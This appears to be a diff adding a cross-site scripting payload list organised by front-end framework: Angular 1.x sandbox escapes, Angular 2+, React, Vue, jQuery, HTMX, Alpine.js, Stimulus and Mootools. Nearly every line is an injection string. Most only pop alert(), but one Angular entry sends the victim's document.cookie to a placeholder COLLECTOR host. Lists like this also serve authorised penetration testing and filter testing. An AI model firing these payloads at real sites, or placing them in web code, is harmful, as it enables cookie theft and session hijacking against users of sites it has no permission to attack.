@@ -1,0 +1,86 @@
+# Framework-Specific XSS Payloads
+# Angular, React, Vue, jQuery, HTMX, Alpine.js, Stimulus
+
+# ==========================================
+# ANGULAR 1.x (sandbox escape)
+# ==========================================
+{{constructor.constructor('alert(document.domain)')()}}
+{{$on.constructor('alert(document.domain)')()}}
+{{a='constructor';b='alert(1)';constructor[a](b)()}}
+{{toString.constructor.prototype.toString.constructor('alert(document.domain)')()}}
+{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(document.domain)')}}
+{{_=toString.constructor.prototype;_.charAt=_.trim;$eval('x=alert(document.domain)')}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}
+{{$new.$$childHead=$new();$new().$eval('x=alert(document.domain)')}}
+{{$on.constructor('location.href="//COLLECTOR/?c="+document.cookie')()}}
+
+# ==========================================
+# ANGULAR 2+ (if sanitization bypassed)
+# ==========================================
+<img src [src]="'x' | safeUrl" onerror="alert(1)">
+<div [innerHTML]="'<img src=x onerror=alert(1)>'"></div>
+[innerHTML]="<img src=x onerror=alert(1)>"
+[src]="'javascript:alert(1)'"
+
+# ==========================================
+# REACT
+# ==========================================
+<div dangerouslySetInnerHTML={{__html: "<img src=x onerror=alert(1)>"}} />
+<a href="javascript:alert(1)">click</a>
+<iframe src="javascript:alert(1)" />
+<img src="javascript:alert(1)" />
+<div ref={(r)=> r.innerHTML='<img src=x onerror=alert(1)>'} />
+<div ref={r => eval('alert(1)')} />
+
+# ==========================================
+# VUE
+# ==========================================
+<div v-html="'<img src=x onerror=alert(1)>'"></div>
+<a :href="'javascript:alert(1)'">click</a>
+<img :src="'javascript:alert(1)'" />
+<div v-bind:inner-html="'<img src=x onerror=alert(1)>'"></div>
+{{$event.constructor.constructor('alert(document.domain)')()}}
+
+# ==========================================
+# jQuery
+# ==========================================
+$('#target').html('<img src=x onerror=alert(1)>')
+$('.class').append('<img src=x onerror=alert(1)>')
+$('.class').prepend('<img src=x onerror=alert(1)>')
+$('<img/src/onerror=alert(1)>')
+$('<svg/onload=alert(1)>')
+$('<body/onload=alert(1)>')
+$('<input/autofocus/onfocus=alert(1)>')
+$(location.hash.slice(1))  # If hash is #<img/src/onerror=alert(1)>
+$.html('<img src=x onerror=alert(1)>')
+$.append('<img src=x onerror=alert(1)>')
+
+# ==========================================
+# HTMX
+# ==========================================
+<div hx-get="/user/profile" hx-trigger="load" _="on load alert(1)"></div>
+<div hx-get="/x" hx-vals='{"x":"<img src=x onerror=alert(1)>"}'></div>
+<button hx-post="/x" hx-vals='{"x":"<img src=x onerror=alert(1)>"}'>
+
+# ==========================================
+# Alpine.js
+# ==========================================
+<div x-data x-init="alert(document.domain)"></div>
+<div x-data="{x: alert(document.domain)}"></div>
+<div x-on:load="alert(document.domain)"></div>
+<button x-on:click="alert(document.domain)">click</button>
+<input x-model="alert(document.domain)">
+<div x-text="'<img src=x onerror=alert(1)>'"></div>
+<div x-html="'<img src=x onerror=alert(1)>'"></div>
+
+# ==========================================
+# Stimulus
+# ==========================================
+<div data-controller="xss" data-action="load->xss#run">
+# With matching controller: run() { alert(document.domain) }
+
+# ==========================================
+# Mootools / Prototype.js
+# ==========================================
+<div onload="alert(1)"></div>
+<a href="javascript:alert(1)">click</a>
